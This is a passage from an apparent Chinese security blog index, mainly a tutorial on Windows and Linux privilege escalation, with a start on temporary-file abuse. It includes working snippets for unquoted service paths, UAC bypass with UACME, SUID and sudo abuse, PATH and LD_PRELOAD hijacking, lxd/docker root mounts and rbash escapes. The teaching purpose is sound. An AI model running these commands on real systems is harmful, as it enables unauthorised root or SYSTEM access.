进行网络连接和数据传输。 2. 安全领域的关系 Socket 是安全工具开发的基础。许多渗透测试工具、扫描器、后门、隧道等，都是直接用 Socket 编程实现的，可以灵活控制协议、端口、数据内容，适合定制化攻击、协议分析、流量伪造等场景。 SOCKS 则是安全攻防中常用的流量转发和代理协议。它可以帮助攻击者或测试者将流量中转到目标网络，实现内网穿透、匿名访问、多级跳板等功能。SOCKS 代理常用于横向移动、数据隧道、突破防火墙等。 3. 适用场景 Socket 适用场景： 自定义协议通信 端口扫描、服务探测 构造&#x2F;分析底层数据包 实现特殊隧道（如ICMP、DNS隧道） 开发定制化安全工具 SOCKS 适用场景： 内网穿透与横向移动 匿名代理、隐藏真实IP 多级代理跳板 代理非HTTP协议的流量（如FTP、SMTP、DNS等） 快速搭建通用流量转发通道 4. 构建 DNS 隧道这两者都可以使用来建立 DNS 隧道，我们可以通过这个来进一步体会这两者之间的区别。 Socket 建立 DNS 隧道 原理：直接用 Socket 编程，构造和发送 DNS 协议的数据包，实现自定义的 DNS 隧道通信。 优点：灵活性极高，可以完全控制数据包内容，适合定制化、隐蔽性强的隧道需求。 适用场景：开发专用的隧道工具、需要规避检测、协议自定义等高级渗透测试。 SOCKS 建立 DNS 隧道 原理：SOCKS 代理支持转发 UDP 流量，DNS 查询本质上是 UDP 协议。客户端配置 SOCKS 代理后，DNS 请求会通过 SOCKS 代理转发到目标服务器，从而实现 DNS 隧道。 优点：配置简单，通用性强，无需自己构造协议，适合快速搭建和流量转发。 适用场景：需要快速实现 DNS 隧道、内网穿透、流量代理等。 小结网上有许多基于这两种方式实现的安全工具，无论是否打算自行开发相关工具，都建议深入学习和掌握这些工具的实际使用方法。 参考文章 references: socket通信原理三次握手和四次握手详解 socket技术详解（看清socket编程）","tags":["Socket","SOCKS"],"categories":["通信"]},{"title":"提权","path":"/2025/07/11/提权/","content":"[TOC] 摘要总结一下windows和linux中的各种提权方法和区别，深入理解提权的本质需求。 提权的本质提权的本质，就是以高权限身份执行系统命令。高权限可以来自系统中已有的高权限用户，这类用户的获取通常依赖于信息泄露或配置缺陷，利用后可直接执行敏感操作。另一种方式是直接添加高权限用户，比如在 Linux 中通过修改 /etc/passwd 文件，或利用内核提权漏洞修改内存信息，创建新的高权限账号。无论哪种方式，最终目标都是突破原有权限限制，获得系统的更高控制权。 提权的方式windows提权CVE 漏洞原理CVE（公共漏洞和曝光）是指公开披露的计算机系统中的安全漏洞。它们可能是由于各种原因引起的，包括代码错误、配置问题或设计缺陷。而这里就有不少的提权漏洞被曝光。常见的提权漏洞包括： 缓冲区溢出漏洞：攻击者通过向系统写入超出预定缓冲区的数据，从而覆盖内存中的指令或数据，进而执行恶意代码。 高权限服务漏洞：一些高权限服务（如计划任务、COM任务、打印服务等）存在设计或逻辑缺陷，允许攻击者利用这些服务提权。 NTLM重放攻击：攻击者伪造合法用户的身份凭证（如NTLM令牌），从而获取权限。 注册表配置错误：Windows注册表中配置不当或暴露的设置，可能允许攻击者绕过权限控制。 windows中比较有名的 CVE 提权漏洞就是土豆家族系列了。因为我们的主要目的还是利用各种手段去进行提权，而不是要挖掘提权漏洞，所以这里我们只需要了解如何借助 CVE 漏洞进行提权即可。 利用不同的 CVE 漏洞有各自的适用条件，利用前需要先进行信息收集。针对 CVE 提权漏洞的信息收集，通常分为三个方面：首先收集目标机器的系统信息，其次根据系统信息筛查已安装或缺失的补丁，最后根据补丁情况选择合适的漏洞利用脚本进行提权。 系统信息收集可以通过工具自动化完成，也可以手动在目标机器上执行系统相关命令，但手动方式不仅繁琐，收集的信息也可能不全面。收集到信息后，还需自行匹配适合的 CVE 漏洞。因此，实际渗透中通常会使用自动化工具进行系统信息收集，这些工具不仅能高效获取系统信息，还能自动推荐目标主机可能存在的提权漏洞，大大提升利用效率。我们这里推荐PEASS-ng项目，这是一个综合的关于提权的信息收集项目，除了支持windows，还支持linux和macOS。 不过，使用工具进行信息收集也有一定局限性。如果工具长时间未更新，可能无法识别较新的 CVE 漏洞；即使工具更新了，如果不是专门针对 CVE 漏洞检测，也可能存在信息缺漏，导致补丁筛选和漏洞匹配不够全面，最终推荐的漏洞可能偏旧。 为此，推荐使用 Windows提权EXP在线搜索工具，只需在目标机器上执行 systeminfo 命令，将结果粘贴到平台即可获得对应的 CVE 漏洞提醒。另外，Windows Exploit Suggester 也是一款实用的脚本工具，可以根据 systeminfo 命令的输出，自动匹配适用的 CVE 漏洞（不仅仅是关于提权的 CVE 漏洞）。虽然这些工具也会受到更新时间的影响，但由于它们专注于 CVE 的收集和匹配，因此获取的信息通常更加全面和准确。对于尚未收录的较新提权漏洞，则需要我们平时多关注 CVE 漏洞报告，及时了解最新动态。 最后一步是获取对应的提权脚本并进行利用。部分工具（如 Cobalt Strike（CS），Metasploit Framework（MSF）等）集成了常见 CVE 漏洞的利用模块，可以直接进行提权操作，但收录并不全面，且某些环境下可能无法使用 CS。这时，我们可以根据 CVE 编号在网上搜索可用的利用脚本。 这里推荐几个优质项目： Kernelhub：收录了大量内核漏洞的 EXP，并对每个漏洞进行了详细描述，作者还标注了脚本是否经过测试及测试结果。可以根据 CVE 编号搜索是否有已验证的 EXP。 PoC in GitHub：收集了各类 CVE 漏洞在 GitHub 上的利用脚本，可通过 CVE 编号快速查找相关 EXP。 Exploit-DB：一个在线漏洞数据库，收录了大量软件、系统和网络漏洞及其利用代码，方便安全研究人员和渗透测试人员获取最新漏洞信息。 优先推荐使用前两个项目进行脚本查找和利用。 进程注入原理进程注入就是攻击者利用系统API，将自己的代码写入高权限进程执行，从而实现权限提升或持久化。 借助进程注入进行权限提升主要存在于 Windows 系统中，因为在 Windows 中，登录获得的最高权限通常是管理员（Administrator），而系统内部还存在一个更高的 SYSTEM 权限。为了执行某些系统级操作，管理员用户往往需要进一步提升到 SYSTEM 权限。进程注入提权只适用于管理员用户，因为普通用户无法调用系统 API 去修改高权限进程，只能操作自身权限范围内的进程。管理员账号本身被设计为拥有系统级别的管理权限，因此可以对系统进程进行操作。 之所以还需要提升到 SYSTEM 权限，是因为部分操作只有 SYSTEM 账号才能执行。例如，在内网渗透中，拿到的是本地管理员权限，但不是域用户权限，无法执行域内相关命令进行信息收集。这时可以通过进程注入提升到 SYSTEM 权限，进行更深入的操作。 而在 Linux 系统中，最高权限就是 root，进程注入无法实现权限提升，因为要操作 root 进程本身就需要 root 权限。这种差异主要源于两种操作系统的安全设计理念和历史发展。 最后，进程注入用于权限提升的场景较少，更多用于权限维持，比如保证重启后依然拥有权限，或用于隐藏自身，规避杀毒软件检测。 利用进程注入有多种方式，包括通过 CreateRemoteThread 和 LoadLibrary 的 DLL 注入、可执行文件注入（PE 注入）、进程 hollow（进程替换、RunPE）、线程执行劫持（挂起、注入并恢复）等。实际操作时，掌握工具使用即可，了解原理有助于区分不同技术。 后三种方式（PE 注入、进程 hollow、线程劫持）都是将恶意代码直接注入到目标进程内存中执行，不会在磁盘上留下文件痕迹。而 DLL 注入则是通过系统 API 打开目标进程，在其内存中分配空间，写入 DLL 路径，再创建新线程执行 LoadLibrary 加载 DLL。这样，恶意代码就能以目标进程的权限运行。由于进程注入需要操作高权限进程，因此通常要求管理员权限。 DLL 劫持则是通过替换目标程序依赖的 DLL 文件实现的，不需要直接操作高权限进程，对权限要求较低。DLL 注入属于主动攻击，可以控制恶意代码的执行时机；而 DLL 劫持则较为被动，恶意代码只有在目标程序加载被劫持的 DLL 时才会执行，可能还需要主动触发。此外，如果替换的是关键 DLL 文件，可能影响程序正常运行，因此在进行权限维持时，恶意 DLL 既要能执行恶意代码，又要兼容原有功能，保证隐蔽性和稳定性。 进程注入我们一般直接使用CS或者MSF上面集成的功能即可，有特殊需求的可以自行在网上找一下其他工具和脚本或者对CS和MSF相关功能进行修改。 DLL劫持原理DLL 劫持是通过替换高权限程序依赖的 DLL 文件，使程序在加载 DLL 时执行我们的恶意代码，从而以高权限运行。 DLL 劫持通常发生在 DLL 路径指定不完整或权限配置不当的情况下。如果程序加载 DLL 时只指定文件名，系统会按照如下顺序查找 DLL 文件： 应用程序的目录 系统目录（如 System32） 16 位系统目录 Windows 目录 当前工作目录 环境变量 PATH 中列出的目录 如果我们能在优先目录写入恶意 DLL，就可以实现劫持。即使 DLL 路径指定完整，只要目标路径可写，也可以通过替换原有 DLL 文件进行劫持。对权限要求不高，因为有些程序可能由低权限用户安装，但被高权限用户执行，或者安装在共享目录，普通用户也有机会利用。 不过，DLL 劫持存在一定风险：需要规避杀毒软件查杀，有时还要等待高权限用户加载 DLL，且可能影响程序正常功能。如果用于权限维持，还需保证恶意 DLL 兼容原有功能。总体来说，DLL 劫持实用性有限，建议优先考虑其他更隐蔽和稳定的方法。 利用DLL 劫持的核心就是查找可劫持目录并编写恶意 DLL 文件进行替换。 前面提到的PEASS-ng 项目也可用于检测可劫持目录。我们还可以使用ChkDllHijack，通过上传对方的exe文件到工具来检测是否存在可以劫持的 DLL 文件，或者使用火绒剑也可以查看程序调用了哪些 DLL 文件。不过这两种方法都不是很好，你要么还要下载对方程序，要么上传工具，但是这两种工具本地使用都是图形化形式，不知道是否支持命令行形式。 最后编写编写恶意 DLL 文件可以使用 MSF ，也可以自己书写。 未引号路径原理未加引号的服务路径漏洞是指：当 Windows 在启动服务时，如果服务的可执行文件路径中包含有空格，但整个路径又未使用双引号包裹。此时，系统便会按照路径优先级逐层查找可执行文件。例如： 假设一个服务的路径是 C:\\Program Files\\Juggernaut Prod\\Production Tools\\Juggernaut.exe。此时，Windows 可能会按照以下顺序逐个尝试查找并执行服务启动程序。 C:\\Program.exe C:\\Program Files\\Juggernaut.exe C:\\Program Files\\Juggernaut Prod\\Production.exe C:\\Program Files\\Juggernaut Prod\\Production Tools\\Juggernaut.exe 这意味着，如果我们有权限在实际的可执行文件位置之前的三个目录中的任何一个中写入内容，那我们就可以制作一个可执行文件，并根据路径中的名称为其命名，就像上面的例子一样。之后，当服务启动时，它将执行我们的恶意程序，而不是预定的程序。 如果我们可以写入 C:\\，我们将制作一个名为 Program.exe 的可执行文件，并将其放入 C:\\；如果我们能写入 C:\\Program Files，我们就会制作一个名为 Juggernaut.exe 的可执行文件，并将其放入 C:\\Program Files。以此类推… linux 启动服务时路径解析机制更为严格和明确，不会因为路径中空格为加引号导致可执行文件查找顺序混乱，因此 linux 中不存在此类利用。 利用我们首先就是需要查询系统中存在哪些未引用路径，我们可以手动进行查询，也可以使用工具，比如我们上网提到的PEASS-ng项目。 cmd查询命令： 1wmic service get name,displayname,startmode,pathname | findstr /i /v &quot;C:\\Windows\\\\&quot; |findstr /i /v &quot;&quot;&quot; 这个命令就是查找系统中自启动，安装路径不在windows目录下且路径中不包含双引号的服务。这里需要服务能够自启动是因为我们的恶意文件需要服务重启才能够执行，而我们普通用户一般不能重启高权限的服务，这个时候就可以通过重启目标机器来实现服务重启，这个就要求服务能够自启动。至于检测安装目录，则是我们普通用户在windows目录下没有写入的权限。 powershell查询命令： 1Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where &#123;$_.PathName -notlike &quot;C:\\Windows*&quot; -and $_.PathName -notlike &#x27;&quot;*&#x27;&#125; | select Name,DisplayName,StartMode,PathName 根据查询到的结果，我们检测哪一个目录下面是可写的，然后使用 MSF 或 CS 生成恶意的exe文件上传即可。 令牌窃取原理令牌（Token）是系统的临时密钥，相当于账户名和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌持续存在系统中，除非系统重新启动。 令牌最大的特点就是随机性，不可预测，一般黑客或软件无法猜测出来，令牌有很多种： 访问令牌（Access Token）：表示访问控制操作主题的系统对象 会话令牌（Session Token）：是交互会话中唯一的身份标识符，可以理解为web中的token 密保令牌（Security Token）：又叫作认证令牌或者硬件令牌，是一种计算机身份效验的物理设备 Windows 的访问令牌（AccessToken） 有两种类型 Delegation Token：授权令牌，也叫主令牌，支持交互式会话登录 (例如本地用户直接登录、远程桌面登录访问) Impresonation Token：模拟令牌，支持非交互的会话 (例如使用 net use访问共享文件夹)。 两种 token 只在系统重启后清除，具有 Delegation token （授权令牌）的用户在注销后，该 Token 将变成Impersonation token（模拟令牌），依旧有效。我们的利用就是借助的访问令牌。 值得一提的是，令牌窃取只能在特权用户上下文中才能完成，因为通过令牌创建进程使用的CreateProcessWithTokenW和CreateProcessAsUserA两个windows API分别要求用户必须拥有SeImpersonatePrivilege和SeAssignPrimaryTokenPrivilege/SeIncreaseQuotaPrivilege特权，而拥有这两个特权的用户一般为系统管理员账户、网络服务账户、系统服务账户（IIS、MSSQL等）。 除此之外，列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。所以，和进程注入一样，令牌窃取更多是使用于将用户从管理员权限提升到系统权限。 利用关于令牌窃取，我们一般都是使用的incognito.exe这个程序，但是网上的下载链接我一直打不开，所以找了一个二改的工具—JCTokenUtil。我们可以借助他来列出当前可以查看的令牌，然后根据PID窃取对应的令牌来执行命令。 我们也可以使用 MSF 和 CS， 他们也都集成了 incognito 的功能。 关于令牌方面的利用还有很多，土豆家族系列中很多都是利用了令牌来进行提权，然后我们还可以借助令牌在内网域中进行横向移动。 其他提权方式我们前面介绍了 Windows 中常见的几种提权方式，实际上还可以通过编写计划任务、修改注册表组策略、利用打印服务漏洞等方式进行提权。 这些方法通常依赖于系统配置不当。例如，写计划任务要求当前用户对某个计划任务有修改权限，并且该任务以高权限运行。 此外，还可以利用第三方软件的高权限账号进行提权，比如数据库管理员账号、TeamViewer 等远程工具的连接凭证，这就需要我们进行充分的信息收集。Cobalt Strike（CS） 支持自动收集 Navicat Premium、TeamViewer 等软件的账号或凭证信息。我们还可以收集本地和浏览器中保存的账号密码，通过重组或爆破尝试获取管理员或其他高权限账号的密码。CS 也内置了获取浏览器存储数据的功能，便于信息收集和账号整理。 另外，一些第三方软件自身的漏洞也可能导致权限提升。例如 WinRAR 的 CVE-2023-38831 代码执行漏洞，可以通过制作钓鱼压缩包，诱导高权限用户解压，从而执行恶意代码，获取高权限。 UAC绕过原理用户账户控制（UAC，User Account Control）是微软在Windows Vista及更高版本操作系统中引入的一种控制机制。其作用在于通知用户是否对应用程序和任务授权使用硬盘驱动器和系统文件，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损对计算机进行更改的目的。 具体来说，用户账户控制要求所有用户在标准账号模式下运行程序和任务，阻止未认证的程序安装，并阻止标准用户进行不当的系统设置改变。它主要用来解决用户以管理员身份登录时可能遇到的问题，防止恶意软件获取特权。 这种设置也和我们前面提到的令牌相关。当用户登录Windows时，操作系统会为用户生成一对初始令牌，分别是代表着用户所拥有的全部权限的完整版本令牌（即管理员权限令牌），以及被限制管理员权限后的普通令牌，二者互为关联令牌；此后，代表用户的进程所使用的令牌都是由普通令牌继承而来，用来进行常规的、非敏感的操作；当用户需要进行一些需要管理员权限的操作时，比如安装软件、修改重要的系统设置时，都会通过弹出提权对话框的形式来提示用户面临的风险，征求用户的同意，一旦用户同意，将会切换到当前普通令牌关联的管理员权限令牌，来进行敏感操作。通过这种与用户交互的方式，避免一些恶意程序在后台悄悄执行敏感操作。我们可以类比Linux系统的sudo命令。 因为我们在进行权限提升的时候可能需要上传和执行文件，这个时候可能就需要对 UAC 进行绕过。 利用在 MSF 中，有一个可以一键提权的内置命令 getsystem，但如果目标机器启用了 UAC，这个命令通常会失效。为此，MSF 还内置了一些 UAC 绕过模块，例如： use exploit/windows/local/bypassuac &#x2F;&#x2F; 适用于旧版 Windows 7 use exploit/windows/local/bypassuac_sluihijack &#x2F;&#x2F; 适用于新版 Windows 10&#x2F;11 use exploit/windows/local/bypassuac_silentcleanup &#x2F;&#x2F; 适用于新版 Windows 10&#x2F;11 不过，MSF 的 UAC 绕过模块并不全面，或者有时我们需要借助其他方法进行提权。所以这里推荐 UACME 项目，它集成了多种 UAC 绕过方法，支持多个 Windows 版本。使用方法如下： 下载并编译 UACME 项目，生成可执行文件。 找到 akagi32.exe，上传到目标机器。 运行命令： 1akagi32.exe 23 c:\\windows\\system32\\calc.exe //真实环境下面可以换成反弹shell或者一个监听模块 其中数字 23 代表不同的利用方式，可参考项目文档选择合适的方法，一共有78个。 建议先收集目标机器信息，在本地搭建相似环境进行测试，确定最佳绕过方式。实际操作时，可通过观察目标进程是否被成功启动来判断绕过是否成功。 小结我们这里虽然提到了很多的提权方式，但是在实践中进程注入和令牌窃取需要先获取管理员权限，而 DLL 劫持和未引号路径则是出现比较少，使用得最多的还是各个 CVE 漏洞。所以我们尽量还是要对windows中一些常用的 CVE 漏洞做到熟悉。 linux提权CVE 漏洞利用过程和 windows 中基本一致，linux 中的 CVE 提权漏洞更多是越权写入，缓冲区溢出等实现的，其中比较有名的就是脏牛漏洞系列。 想要收集系统存在的 CVE 漏洞，我们可以使用 PEASS-ng 项目，他也支持 linux 。这是一个综合的关于提权的信息收集工具，我们这里再介绍两个专门进行 CVE 漏洞收集的——traitor和]linux-exploit-suggester。 SUID 提权原理SUID是一种文件权限机制，它允许用户以文件所有者的权限执行该文件，最主要的意义就是普通让用户以 root 权限执行该文件。系统中常见的 SUID 文件有： /usr/bin/passwd：允许普通用户修改自己的密码，需要写入 /etc/shadow，而普通用户无权直接修改该文件。 /usr/bin/sudo：允许普通用户以 root 或其他用户身份执行命令，便于权限管理和运维。 /bin/ping：允许普通用户发送 ICMP 包（需要原始套接字权限），便于网络测试。 这些操作本身是用户日常管理所需（如改密码、网络测试），但又涉及系统敏感资源。通过 SUID 机制，既能保证安全，又能让普通用户方便地完成这些操作，避免直接暴露 root 权限。这也是实现权限最小化和操作可控的一种方式，提高了系统的灵活性和可用性。 有时候，赋予某些文件 SUID 权限会导致用户可以进行权限提升从而以高权限执行其他系统命令。例如，如果为 /usr/bin/find 设置了 SUID 位，就会导致本地提权。这主要是因为 find 命令支持 -exec 参数，可以用来执行任意命令，如： 1find . -exec whoami \\; -quit //如果被赋予了 SUID 权限，这个时候显示的就是 root 也可以直接执行 sh，从而获得一个以 root 权限运行的 shell。 并不是所有 SUID 文件都会导致提权漏洞，关键在于被赋予 SUID 的程序是否存在可利用的功能。例如，/usr/bin/cp 如果被赋予 SUID 权限，攻击者可以用它覆盖如 /etc/passwd 这样的敏感文件，或者通过 cp 修改文件的所有者为 root，从而间接实现权限提升。 因此，利用 SUID 实现权限提升通常需要满足两个条件： 被赋予 SUID 的文件所有者必须是高权限用户（如 root）； 该文件本身存在可被利用的功能或缺陷。 利用我们需要先判断目标机器中有哪些文件被赋予了 SUID 权限，然后再判断这些文件是否存在可以利用。 我们可以手工使用命令查找： 123find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; PEASS-ng 项目也可以进行检测，而且他会直接帮我们查找出可以利用的文件，而不是像手工执行命令会将所有文件列出。 然后判断哪些文件可以利用，以及具体怎么进行利用，我们可以使用GTFOBins 这个项目，他收集和整理 Unix&#x2F;Linux 系统中常见二进制文件的利用方法，这些方法可以用于绕过安全限制、提升权限或执行其他恶意操作。我们直接在上面搜索对应的二进制文件，如果他存在 SUID 利用，就会显示一个 SUID 标签，我们查看对应内容然后按照格式进行利用即可。 如果目标机器上面存在对方自己书写的二进制文件被赋予了 SUID 权限，而其他文件又不能进行利用，这个时候可能就需要我们去自己分析该文件是否可以利用来进行权限提升。 SUDO 提权原理SUDO 是一个权限委托工具，允许普通用户以其他用户（通常是 root ）的身份执行命令。 相比于 SUID ，SUDO 可以实现更加精细化的权限管理。 特性 SUID sudo 权限控制 只能以文件所有者身份运行 可指定以任意用户身份运行 粒度 粗，谁都能执行 细，可限制用户、命令、时间等 审计 无日志 有日志，便于追踪 配置 依赖文件权限 依赖 sudoers 配置文件 安全风险 程序有漏洞易被利用 更易管理和限制，风险更低 基于权限配置利用 SUDO 进行权限提升的过程与 SUID 类似。不同之处在于，如果我们不知道高权限用户的密码，就需要在配置时设置为免密码执行。例如： 1user1 ALL=(root) NOPASSWD: /usr/bin/apt # 写入 /etc/sudoers，也可以配置为用户组 这样配置后，user1 就可以以 root 身份执行 apt 命令，并且无需输入 root 密码。 我们也可以发现这个的利用条件相对来讲也是更加苛刻，所以利用 SUDO 来进行权限提升很多时候我们借助的不是配置错误，而是他本身设计上存在的缺陷来进行权限提升，历史上曾曝出过多个有关他的 CVE 提权漏洞。如：CVE-2019-14287，CVE-2021-3156，CVE-2023-22809。最近又曝出了两个高危的提权漏洞：CVE-2025-32462、CVE-2025-32463。所以在考虑 SUDO 时，我们可以重点观察一下他的版本和其他信息，看是否符合利用条件。 利用基于错误配置的利用和 SUID 基本一致，手工查看有哪些 SUDO 配置使用sudo -l，上面运用到的工具也都适用于 SUDO 。 而基于历史漏洞的利用我们可以参考 CVE 的利用，但是我们也可以发现上面有两个漏洞是比较新的，检测工具不一定有收录，这个时候就需要我们人工去判断，这也是要求我们平时关注各个 CVE 漏洞的原因。 Cron计划任务提权原理计划任务主要指的时让系统或用户在指定时间自动执行某些命令或者脚本的机制。当某一个计划任务以高权限运行一个脚本时，而且我们当前用户对该脚本具有写入权限，那么我们就可以修改脚本内容，让他以高权限执行特定命令。可以看出利用条件还是比较苛刻，基本是只存在于ctf题目中。 利用我们首先查看目标机器中存在哪些计划任务cat /etc/crontab，然后对以高权限运行脚本的计划任务，我们再查看是否有权限修改对应脚本，如果有权限的话，我们写入反弹命令之类的即可。 环境变量（path）提权原理这里需要配合 SUID 或者 SUDO 的配置，否则单纯使用这个并不能进行权限提升。 我们前面提到，被赋予 SUID 或 SUDO 权限的文件有时可能是用户自定义的脚本，这些脚本中可能会调用系统已有的命令。虽然我们无法修改系统命令本身，但通常在脚本中调用命令时只写命令名（如 ls），而不是完整路径（如 /usr/bin/ls）。此时，系统会根据环境变量 PATH 的顺序查找可执行文件。 PATH 默认值一般为 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin。如果我们将自己的目录添加到 PATH 的最前面，系统查找命令时就会优先在我们指定的目录中查找。这样，我们可以在该目录下创建一个与系统命令同名的恶意脚本。当高权限脚本执行时，就会以高权限运行我们自定义的恶意命令，从而实现权限提升。 利用也是先查看目标机器的 SUID 和 SUDO 配置，参考上面利用。然后查看高权限配置中是否有用户自己创建的文件，如果有，查看和分析文件内容，看是否有调用到系统中已经存在的命令。 然后就是修改变量和写入恶意同名文件，可以参考下面命令： 123cd /tmpecho &quot;/bin/sh&quot; &gt; curlchmod 777 curl 最后执行对应的脚本文件即可。 CRON 任务运行环境与用户登录 shell 环境不同，不会自动加载用户自定义的 PATH 设置，想要实现利用，需要修改/etc/crontab文件，但是我们没有权限，所以不考虑。 动态链接库提权原理在 PHP 中，我们常用动态链接库绕过 disable_functions，在 Linux 下也可以利用类似原理进行权限提升，但条件较为苛刻。 LD_PRELOAD 是 Linux 的一个环境变量，用于在程序运行时强制加载指定的共享库（.so 文件），并优先于系统默认库进行链接。这样可以“劫持”或“替换”程序中用到的某些函数，实现自定义功能、调试、测试或攻击。 程序运行时，动态链接器会优先加载 LD_PRELOAD 指定的库。 如果库中实现了与系统库同名的函数，程序会优先调用自定义函数。 这样可以拦截并修改程序对某些函数的调用行为。 利用虽然可以针对具体函数进行劫持，但这样做需要分析程序加载了哪些函数、哪些函数可被劫持，并且还要考虑劫持后对程序原有功能的影响。 因此，通常会利用 C 语言的特性，比如 _init()（ELF 动态库的初始化函数）或 __attribute__((constructor)) 修饰的构造函数。只要库被加载，这些函数就会自动执行，无需等待目标程序调用特定函数。推荐使用 constructor，兼容性更好。 需要注意的是，SUID 程序和 CRON 任务默认不会加载 LD_PRELOAD 环境变量。而 SUDO 只有在 /etc/sudoers 文件中添加 Defaults env_keep += LD_PRELOAD 后，才会保留该变量。此时，可以编译恶意动态库，并通过如下方式利用： 1sudo LD_PRELOAD=/tmp/root.so 程序或命令 这样，恶意库会被优先加载并执行，实现权限提升。但由于条件苛刻，实际利用价值有限。 此外，有时并不是通过 LD_PRELOAD 环境变量劫持。有些用户自定义程序时，会将常用函数放在自建的共享库目录中（非标准库路径）。如果该目录对当前用户可写，且程序以高权限运行，也可以通过替换库文件实现劫持。这种方式与 PATH 劫持类似。 特权组（lxd）提权原理LXD（Linux容器守护程序）是一个系统级容器管理器，它基于LXC（Linux容器）技术。LXD提供了更高级别的接口和管理工具，使得轻松创建和管理系统容器成为可能。LXD主要面向系统级容器，可以运行完整的操作系统镜像，并提供类似于虚拟机的环境。它提供了更好的隔离性、资源控制和安全性。 LXC（Linux容器）是Linux内核提供的一种虚拟化技术，它允许在单个Linux内核上运行多个隔离的用户空间实例。LXC提供了一组工具和API，用于创建和管理容器。LXC容器通常比LXD容器更加灵活和轻量级，可以定制底层操作系统的各个方面。LXC更适合于需要更细粒度控制的使用场景。 如果目标机器上面安装并初始化了 LXD 服务（都是以 root 权限运行，因为需要进行容器管理、资源挂载等高权限操作）而且我们当前取得的用户权限是属于lxd组，那么我们就可以利用 LXD 进行权限提升。 在主机和容器之间建立通信（如 socket 连接）时，主机端的 socket 是由 LXD 服务（root）创建和管理的，因此通信过程中的操作都以 root 权限执行，而不是以发起请求的普通用户权限执行。当用户通过 LXD 客户端发起操作时，实际上是让 LXD 服务（root）在主机上执行相关任务。 除了 LXD 之外，DOCKER 也存在这种利用，这里就是要求我们是属于dokcer组，在具体原理上面存在细微差异，但是也是借助的以 root 权限运行的服务。 利用首先使用id命令查看当前用户权限，如果符合条件是lxd组，可以按照下面的格式进行利用： 12345lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias test //导入这个镜像命名为test容器lxc init test test -c security.privileged=true //初始化这个镜像lxc config device add test test disk source=/ path=/mnt/root recursive=true //挂载镜像磁盘，镜像的/mnt/root目录就是真实下的/目录。lxc start test //启动这个test容器lxc exec test /bin/sh //获取这个test容器shell，进入容器 然后我们就可以在这个容器中以 root 权限执行命令，我们在容器中创建和修改文件也会直接反应到主机（真实环境）下面对应的目录和文件上面。 如果是docker组，可以执行： 1docker run -v /:/mnt -it alpine 这个命令启动一个基于 Alpine 镜像（镜像无所谓）的 Docker 容器，并且： 将 宿主机的根目录 &#x2F; 挂载到容器内的 &#x2F;mnt 目录。 提供一个 交互式终端，允许你在容器内像使用普通终端一样运行命令。 最后，如果我们想要得到真实环境下以 root 权限运行的 shell，我们直接在容器中执行反弹命令是无效的，我们最终得到的还是容器环境。我们可以通过写计划任务反弹，写 SSH 密匙进行连接，破解/etc/shadow文件中的密码等来进行逃逸，获取 root 权限。 还有两个特权组没有具体提，一个是 disk组，他对磁盘设备具有读写权限；另一个是adm组，他可以读取敏感日志，间接获取凭证。我们做一个了解即可。 其他提权方式我们还可以借助Capability能力，NSF服务，通配符等进行权限提升。以及，跟 windows 也差不多，我们也可以借助一些第三方服务的高权限账号或者漏洞进行权限提升。最后，我们还可以查看一些历史命令，日志信息等进行信息收集，看是否有泄露什么高权限的账号密码或者凭证。 rbash绕过原理rbash（Restricted Bash，受限 Bash）是 Bash shell 的一种受限模式。 当你以 rbash 或 bash --restricted 启动 shell 时，Bash 会限制用户的某些操作，比如： 不能用 cd 切换目录 不能设置或修改 PATH、SHELL 等环境变量 不能重定向输入输出 不能执行带有 / 路径的命令（只能运行 PATH 里的命令） 不能导出或取消导出 shell 函数 利用rbash 绕过的核心思路就是想办法调用一个未受限制的新 shell（如 /bin/bash 或 /bin/sh），这样就能获得完整的命令执行能力，摆脱受限环境。常见方法都是利用系统中可用的程序间接启动新 shell。 12345678910awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;find . -exec /bin/bash \\; -quitperl -e &#x27;exec &quot;/bin/bash&quot;;&#x27;python -c &#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27;vi:!bashless /etc/passwd!bash 小结整个 linux 中可以使用来进行权限提升的点还是非常多的，其中大多数都是由于配置不当导致的。 在实际渗透利用中，建议优先检查常规的 SUID 等提权方式，这样产生的流量较小，痕迹也较少。如果没有发现可利用点，可以借助 PEASS-ng 项目进行信息收集，该工具能够检测大部分常见漏洞。如果仍未找到突破口，可以进一步排查当前系统已安装的服务，分析是否存在可利用的服务或配置。若依然无果，可以尝试使用更有针对性的工具进行深度信息收集，或关注并测试近期披露的 CVE 漏洞。最后，如果技术手段受限，也可以尝试收集系统中的账号或凭证信息，寻找其他突破口。 总结我们回过头来看，可以发现所有提权方式都是围绕着我们一开始提到的提权的本质在进行，这对我们挖掘权限提升之类的漏洞可能可以带来一点启发。 最后，无论是在 windows 还是 linux 中，提权的利用方式都非常多，我们不仅仅是要做到了解，建议还是多多动手操作一下，既是增加熟练度和理解，也是为了将问题尽量在练习中进行解决。很多时候，原理我们都懂，但是实际操作起来可能还是会遇到不少问题。 参考文章 references: 小迪渗透b站视频权限提升部分 windows提权-访问令牌操纵 Linux提权基础分享和讨论","tags":["提权"],"categories":["攻击思路"]},{"title":"临时文件的利用","path":"/2025/06/28/临时文件的利用/","content":"[TOC] 摘要在应用环境中，通常会生成各种临时文件，这些文件可能来源于应用自身，也可能由第三方组件创建。如果攻击者能够控制临时文件的内容，可能会带来安全风险。本文将介绍不同环境下临时文件的生成方式及其利用方式。 临时文件临时文件的产生语言本身机制我们对任意一个PHP文件（要求这个php文件必须存在）发送一个上传的数据包时，不管这个PHP服务后端是否有处理$_FILES的逻辑，PHP都会将用户上传的数据先保存到一个临时文件中，这个文件一般位于系统临时目录，文件名是php开头，后面跟6个随机字符。 这样做的原因是方便用户直接通过S_FILES访问上传文件，不用自己解析multipart/form-data格式，应用在不同操作系统平台运行也能够得到兼容，还避免了内存溢出。 第三方服务像 Python 的 Flask、Django 框架，Java 的 Tomcat、Weblogic 服务器，以及 PHP 